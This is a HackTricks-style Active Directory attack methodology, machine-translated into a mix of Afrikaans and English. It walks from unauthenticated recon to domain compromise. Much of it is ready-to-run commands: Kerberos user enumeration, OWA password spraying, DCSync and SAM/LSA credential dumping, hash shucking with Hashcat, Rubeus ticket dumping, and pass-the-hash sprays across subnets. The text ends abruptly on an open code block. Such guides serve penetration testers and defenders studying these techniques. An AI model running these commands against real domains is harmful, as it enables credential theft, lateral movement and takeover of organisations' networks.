# Active Directory Metodologie

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as 'n grondliggende tegnologie wat **netwerkadministrateurs** toelaat om doeltreffend **domeine**, **gebruikers**, en **voorwerpe** binne 'n netwerk te skep en te bestuur. Dit is ontwerp om te skaal en maak dit moontlik om 'n groot aantal gebruikers in hanteerbare **groepe** en **subgroepe** te organiseer, terwyl **toegangsregte** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domeine**, **bome**, en **woude**. 'n **Domein** omvat 'n versameling voorwerpe, soos **gebruikers** of **toestelle**, wat 'n gemeenskaplike databasis deel. **Bome** is groepe van hierdie domeine wat deur 'n gedeelde struktuur verbind is, en 'n **woud** verteenwoordig die versameling van meerdere bome wat deur **vertrouensverhoudings** met mekaar verbind is en die hoogste laag van die organisasiestruktuur vorm. Spesifieke **toegangs**- en **kommunikasie-regte** kan op elkeen van hierdie vlakke aangewys word.

Belangrike konsepte binne **Active Directory** sluit in:

1. **Directory** – Huisves alle inligting wat met Active Directory-voorwerpe verband hou.
2. **Object** – Verwys na entiteite binne die directory, insluitend **gebruikers**, **groepe**, of **gedeelde vouers**.
3. **Domain** – Dien as 'n houer vir directory-voorwerpe, met die vermoë vir meerdere domeine om binne 'n **woud** te bestaan, elk met hul eie versameling voorwerpe.
4. **Tree** – 'n Groepering van domeine wat 'n gemeenskaplike root-domein deel.
5. **Forest** – Die hoogste vlak van die organisasiestruktuur in Active Directory, saamgestel uit verskeie bome met **vertrouensverhoudings** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat 'n reeks dienste wat krities is vir die gesentraliseerde bestuur en kommunikasie binne 'n netwerk. Hierdie dienste bestaan uit:

1. **Domain Services** – Sentraliseer data-opberging en bestuur interaksies tussen **gebruikers** en **domeine**, insluitend **verifikasie** en **soek** funksionaliteit.
2. **Certificate Services** – Oor sien die skep, verspreiding, en bestuur van veilige **digitale sertifikate**.
3. **Lightweight Directory Services** – Ondersteun directory-gevorderde toepassings deur die **LDAP protocol**.
4. **Directory Federation Services** – Verskaf **single-sign-on** vermoëns om gebruikers oor meerdere webtoepassings in een sessie te autentiseer.
5. **Rights Management** – Help om kopieregmateriaal te beskerm deur ongesagde verspreiding en gebruik te beheer.
6. **DNS Service** – Krities vir die oplossing van **domeinnaam**.

Vir 'n meer gedetailleerde verduideliking kyk: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om **'n AD aan te val** moet jy die **Kerberos authentication process** baie goed verstaan.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Spiekbrief

Jy kan baie op [https://wadcoms.github.io/](https://wadcoms.github.io) kry om vinnig te sien watter opdragte jy kan gebruik om 'n AD te enumere/uitbuit.

> [!WARNING]
> Kerberos-kommunikasie **vereis 'n volle gekwalifiseerde naam (FQDN)** om aksies uit te voer. As jy probeer om 'n masjien via die IP-adres te bereik, **sal dit NTLM gebruik en nie Kerberos nie**.

## Recon Active Directory (Geen creds/sessies)

As jy slegs toegang tot 'n AD-omgewing het, maar geen credentials/sessies het, kan jy:

- **Pentest die netwerk:**
- Skandeer die netwerk, vind masjiene en oop poorte en probeer **kwesbaarhede uitbuit** of **credentials onttrek** van hulle (byvoorbeeld, [printers could be very interesting targets](ad-information-in-printers.md).
- DNS-enumerasie kan inligting oor sleutelbedieners in die domein gee soos web, printers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Kyk na die Algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) om meer inligting te vind oor hoe om dit te doen.
- **Kontroleer vir null en Guest toegang op smb-dienste** (dit sal nie op moderne Windows-weergawes werk nie):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 'n Meer gedetailleerde gids oor hoe om 'n SMB-bediener te enumere kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumereer Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 'n Meer gedetailleerde gids oor hoe om LDAP te enumere kan hier gevind word (gee **spesiale aandag aan die anonieme toegang**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Vergiftig die netwerk**
- Versamel credentials deur [**dienste te impersonateer met Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Verkry toegang tot 'n gasheer deur [**misbruik te maak van die relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Versamel credentials deur **valse UPnP-dienste bloot te stel met evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Onttrek gebruikersname/naam uit interne dokumente, sosiale media, dienste (veral web) binne die domeinomgewings en ook van publiek beskikbare bronne.
- As jy die volledige name van maatskappywerkers vind, kan jy verskillende AD **gebruikersnaam-konvensies** probeer ([**lees dit**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die mees algemene konvensies is: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters van elkeen), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _wanware letters en 3 wanware syfers_ (abc123).
- Gereedskap:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Gebruiker-enumerasie

- **Anonieme SMB/LDAP enum:** Kyk na die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) bladsye.
- **Kerbrute enum**: Wanneer 'n **ongeldige gebruikersnaam versoek** word sal die bediener reageer met die **Kerberos error** kode _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons toelaat om te bepaal dat die gebruikersnaam ongeldig was. **Geldige gebruikersname** sal óf die **TGT in 'n AS-REP** reaksie veroorsaak óf die fout _KRB5KDC_ERR_PREAUTH_REQUIRED_, wat aandui dat die gebruiker verplig is om pre-verifikasie te doen.
- **Geen verifikasie teen MS-NRPC nie**: Deur auth-level = 1 (Geen verifikasie) teen die MS-NRPC (Netlogon) koppelvlak op domeincontrollers te gebruik. Die metode roep die `DsrGetDcNameEx2` funksie aan nadat die MS-NRPC-koppelvlak gebind is om te kontroleer of die gebruiker of rekenaar bestaan sonder enige credentials. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) instrument implementeer hierdie tipe enumerasie. Die navorsing kan hier gevind word [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Indien jy een van hierdie servers in die netwerk gevind het, kan jy ook **user enumeration teen dit** uitvoer. Byvoorbeeld, jy kan die tool [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Jy kan lysies van gebruikersname vind in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jy behoort egter die **name van die mense working on the company** te hê vanaf die recon-stap wat jy voorheen moes uitgevoer het. Met die naam en van kan jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om potensiële geldige gebruikersname te genereer.

### Knowing one or several usernames

Ok, so jy weet alreeds dat jy 'n geldige username het maar geen wagwoorde nie... Probeer dan:

- [**ASREPRoast**](asreproast.md): As 'n gebruiker **het nie** die attribuut _DONT_REQ_PREAUTH_ nie, kan jy **request a AS_REP message** vir daardie gebruiker om data te kry wat deur 'n afleiding van die gebruiker se wagwoord versleuteld is.
- [**Password Spraying**](password-spraying.md): Probeer die mees **common passwords** met elkeen van die ontdekte gebruikers; dalk gebruik 'n gebruiker 'n swak wagwoord (hou die password policy in gedagte!).
- Let wel dat jy ook kan **spray OWA servers** om toegang tot die gebruikers se mail servers te probeer kry.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy mag dalk in staat wees om sekere uitdaging **hashes** te **obtain** wat jy kan kraak deur sekere protokolle van die **network** te **poisoning**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

As jy daarin geslaag het om die Active Directory te enumereer sal jy **meer emails and a better understanding of the network** hê. Jy mag in staat wees om NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) af te dwing om toegang tot die AD env te kry.

### NetExec workspace-driven recon & relay posture checks

- Gebruik **`nxcdb` workspaces** om AD recon state per engagement te behou: `workspace create <name>` spawns per-protocol SQLite DBs onder `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Skakel views met `proto smb|mssql|winrm` en lys ingesamelde secrets met `creds`. Skrap sensitiewe data manueel wanneer klaar: `rm -rf ~/.nxc/workspaces/<name>`.
- Vinnige subnet-ontdekking met **`netexec smb <cidr>`** openbaar **domain**, **OS build**, **SMB signing requirements**, en **Null Auth**. Lede wat `(signing:False)` wys is **relay-prone**, terwyl DCs dikwels signing vereis.
- Genereer **hostnames in /etc/hosts** reguit vanaf NetExec output om targeting te vergemaklik:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wanneer **SMB relay to the DC is blocked** deur signing, ondersoek steeds die **LDAP**-houding: `netexec ldap <dc>` wys `(signing:None)` / swak channel binding. ’n DC wat SMB signing vereis maar LDAP signing gedeaktiveer het, bly ’n lewensvatbare **relay-to-LDAP** teiken vir misbruik soos **SPN-less RBCD**.

### Kliëntkant drukker credential leaks → massale domein credential-validasie

- Printer/web UIs inkorporeer soms **gemaskerde admin-wagwoorde in HTML**. Die bron/devtools besigtig kan duidelike teks openbaar (bv., `<input value="<password>">`), wat Basic-auth toegang tot scan/print repositories moontlik maak.
- Opgehaalde druktake kan **platte teks onboarding docs** bevat met per-gebruiker wagwoorde. Hou pare gesinkroniseer wanneer jy toets:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

As jy ander PCs of shares kan toegang kry met die **null or guest user** kan jy lêers plaas (soos 'n SCF file) wat, as dit op een of ander manier geopen word, 'n **NTLM authentication against you** sal trigger sodat jy die **NTLM challenge** kan steel om dit te crack:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** beskou elke NT hash wat jy reeds het as 'n kandidaat-wagwoord vir ander, stadiger formate waarvan die sleutelmateriaal direk uit die NT hash afgelei word. In plaas daarvan om lang wagwoorde te brute-force in Kerberos RC4 tickets, NetNTLM challenges, of cached credentials, voer jy die NT hashes in Hashcat’s NT-candidate modes en laat dit wagwoordhergebruik valideer sonder om ooit die plaintext te leer. Dit is besonder kragtig ná 'n domein-kompromieer wanneer jy duisende huidige en historiese NT hashes kan insamel.

Gebruik shucking wanneer:

- Jy 'n NT korpus het van DCSync, SAM/SECURITY dumps, of credential vaults en moet toets vir hergebruik in ander domeine/forests.
- Jy RC4-gebaseerde Kerberos materiaal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, of DCC/DCC2 blobs vasvang.
- Jy vinnig hergebruik vir lang, onkraakbare passphrases wil bewys en onmiddellik via Pass-the-Hash kan pivot.

Die tegniek **werk nie** teen enkripsietipes wie se sleutels nie die NT hash is nie (bv. Kerberos etype 17/18 AES). As 'n domein AES-only afdwing moet jy terugval na die gewone password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Hou die username/domain wat elke hash geproduseer het op (selfs as die woordlys slegs hex bevat). Gelykende hashes vertel jou dadelik watter prinsipaal 'n wagwoord hergebruik sodra Hashcat die wenkandidaat print.
- Verkies kandidate van dieselfde forest of 'n trusted forest; dit maksimeer die kans op oorvleueling wanneer jy shuck.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.

## Enumerating Active Directory WITH credentials/session

Vir hierdie fase moet jy die **credentials or a session of a valid domain account** gekompromitteer hê. As jy geldige credentials of 'n shell as 'n domain user het, **moet jy onthou dat die opsies wat vroeër genoem is steeds opsies is om ander users te kompromitteer**.

Voordat jy met geauthentiseerde enumerasie begin, moet jy weet wat die **Kerberos double hop problem** is.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Dit is baie maklik om al die domain gebruikersname van Windows te kry (`net user /domain` ,`Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumeration afdeling klein is, dit is die belangrikste deel van alles. Gaan die skakels deur (veral die een oor cmd, powershell, powerview en BloodHound), leer hoe om 'n domein te enumereer en oefen totdat jy gemaklik voel. Tydens 'n assessment sal dit die sleutelmoment wees om jou pad na DA te vind of te besluit dat niks meer gedoen kan word nie.

### Kerberoast

Kerberoasting behels om **TGS tickets** te bekom wat deur dienste wat aan user accounts gekoppel is gebruik word en hul enkripsie te crack — wat gebaseer is op user passwords — **offline**.

More about this in:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sodra jy sommige credentials bekom het, kan jy kontroleer of jy toegang tot enige **machine** het. Hiervoor kan jy **CrackMapExec** gebruik om met verskeie protocols op verskillende servers te probeer verbind, volgens jou port scans.

### Local Privilege Escalation

As jy credentials of 'n session as 'n gewone domain user gekompromitteer het en jy het **access** met hierdie user tot **enige machine in die domain**, moet jy probeer om plaaslik privileges op te gradeer en te loots vir credentials. Dit is omdat slegs met local administrator privileges jy die hashes van ander users in memory (LSASS) en lokaal (SAM) kan dump.

Daar is 'n volledige bladsy in hierdie boek oor [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) en 'n [**checklist**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Current Session Tickets

Dit is baie **onwaarskynlik** dat jy **tickets** in die huidige user sal vind wat jou toestemming gee om onverwante resources te bereik, maar jy kan dit nagaan:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

As jy daarin geslaag het om die Active Directory te enumereer sal jy **meer e-posadresse en 'n beter begrip van die netwerk** hê. Jy kan dalk NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Noudat jy 'n paar basiese credentials het, moet jy nagaan of jy enige **interessante lêers wat binne die AD gedeel word** kan **vind**. Jy kan dit handmatig doen, maar dit is 'n baie vervelige herhalende taak (veral as jy honderde dokumente vind wat jy moet nagaan).

[**Volg hierdie skakel om te leer oor tools wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

As jy toegang tot ander PCs of shares kan kry, kan jy lêers plaas (soos 'n SCF file) wat, indien op een of ander manier geopen word, 'n **NTLM authentication against you** sal uitlok sodat jy die **NTLM challenge** kan steel om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geverifieerde gebruiker in staat gestel om **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Vir die volgende tegnieke is 'n gewone domain user nie genoeg nie; jy benodig spesiale privileges/credentials om hierdie aanvalle uit te voer.**

### Hash extraction

Hooplik het jy daarin geslaag om 'n **local admin** rekening te compromise using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Lees hierdie bladsy oor verskillende maniere om die hashes te bekom.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie aanval poog om die gebruiker se **NTLM hash te gebruik om Kerberos tickets aan te vra**, as 'n alternatief vir die algemene Pass The Hash oor die NTLM-protokol. Dit kan veral **nuttig wees in netwerke waar NTLM protocol gedeaktiveer is** en slegs **Kerberos toegelaat** word as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)** aanvalsmethode steel aanvallers **'n gebruiker se authentication ticket** in plaas van hul wagwoord of hash-waardes. Hierdie gesteelde ticket word dan gebruik om die gebruiker te **impersonate**, en sodoende ongeoorloofde toegang tot hulpbronne en dienste binne 'n netwerk te verkry.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **password** van 'n **local administrato r** het, moet jy probeer om **lokale login** op ander **PCs** daarmee uit te voer.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let wel dat dit nogal **lawaaiig** is en **LAPS** dit sou **versag**.

### MSSQL-misbruik & Vertroude skakels

As 'n gebruiker die voorregte het om toegang tot **MSSQL instances** te kry, kan hy dit gebruik om **opdragte uit te voer** op die MSSQL-host (as dit as SA loop), die NetNTLM **hash** te **steel** of selfs 'n **relay attack** uit te voer.\
As 'n MSSQL-instantie vertrou word (database link) deur 'n ander MSSQL-instantie, en die gebruiker het voorregte oor die vertroude databasis, sal hy in staat wees om **die vertrouensverhouding te gebruik om ook navrae in die ander instansie uit te voer**. Hierdie vertroue kan aanmekaar gekoppel wees en op 'n stadium kan die gebruiker 'n verkeerd geconfigureerde databasis vind waar hy opdragte kan uitvoer.\
**Die skakels tussen databasisse werk selfs oor forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT-bate / implementasieplatforms misbruik

Derdeparty-inventaris- en implementasie-suite openbaar dikwels kragtige paaie na credentials en code-uitvoering. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Indien jy enige Computer-objek vind met die attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) en jy het domeinvoorregte op die rekenaar, sal jy in staat wees om TGTs uit die geheue van elke gebruiker wat op die rekenaar aanmeld, te dump.\
Dus, as 'n **Domain Admin** op die rekenaar aanmeld, sal jy sy TGT kan dump en hom kan impersonate met [Pass the Ticket](pass-the-ticket.md).\
Dankie aan constrained delegation kan jy selfs **outomaties 'n Print Server kompromitteer** (hopelik is dit 'n DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As 'n gebruiker of rekenaar vir "Constrained Delegation" toegelaat is, sal dit in staat wees om **enige gebruiker te impersonate om toegang tot sekere dienste op 'n rekenaar te kry**.\
Indien jy dan die **hash van hierdie gebruiker/reknaar kompromitteer**, sal jy in staat wees om **enige gebruiker te impersonate** (selfs Domain Admins) om toegang tot daardie dienste te kry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Om **WRITE**-voorreg op 'n Active Directory-objek van 'n afgeleë rekenaar te hê, maak dit moontlik om code-uitvoering met **verhoogde voorregte** te bereik:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs-misbruik

Die gekompromitteerde gebruiker kan sommige **interessante voorregte oor sekere domeinobjekte** hê wat jou toelaat om lateraal te **beweeg**/**voorregte op te gradeer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler-diensmisbruik

Om 'n **Spool-diens wat luister** binne die domein te ontdek, kan **misbruik** word om **nuwe credentials te verkry** en **voorregte op te eskaleer**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Derdparty-sessies-misbruik

As **ander gebruikers** die **gekompromitteerde** masjien **benader**, is dit moontlik om **credentials uit geheue te versamel** en selfs **beacons in hul prosesse te inject** om hulle te impersonate.\
Gewoonlik sal gebruikers toegang tot die stelsel via RDP kry, hier is hoe om 'n paar aanvalle oor derdeparty RDP-sessies uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bied 'n stelsel om die **lokale Administrator-wagwoord** op domein-gekoppelde rekenaars te bestuur, wat verseker dat dit **gerandomiseer**, uniek en gereeld **verander**. Hierdie wagwoorde word in Active Directory gestoor en toegang word deur ACLs tot geautoriseerde gebruikers beperk. Met genoegsame permissies om hierdie wagwoorde te lees, word pivoting na ander rekenaars moontlik.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Die versameling van sertifikate** vanaf die gekompromitteerde masjien kan 'n manier wees om voorregte binne die omgewing te eskaleer:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

As **kwetsbare templates** gekonfigureer is, is dit moontlik om hulle te misbruik om voorregte te eskaleer:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sodra jy **Domain Admin** of selfs beter **Enterprise Admin** voorregte kry, kan jy die **domeindatabasis** dump: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Sommige van die tegnieke wat vroeër bespreek is, kan vir persistentie gebruik word.\
Byvoorbeeld kan jy:

- Maak gebruikers kwesbaar vir [**Kerberoast**](kerberoast.md)

```bash
